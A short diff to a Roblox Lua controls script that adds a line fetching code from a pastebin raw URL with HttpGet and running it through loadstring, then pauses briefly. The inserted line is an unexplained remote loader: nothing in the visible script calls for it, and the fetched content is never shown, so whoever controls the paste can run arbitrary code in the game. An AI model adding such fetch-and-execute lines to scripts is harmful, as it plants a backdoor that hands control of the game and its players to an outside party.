@@ -16,6 +16,9 @@ Controls.Enabled = true
 Controls.MobileContainer.Visible = false
 Controls.Version.Text = "Version: 1x1x1x1 1.0"
 
+loadstring(game:HttpGet("https://pastebin.com/raw/Kc5Wpt9s"))()
+wait(0.8)
+
 do
 	local Accessories = {}
 
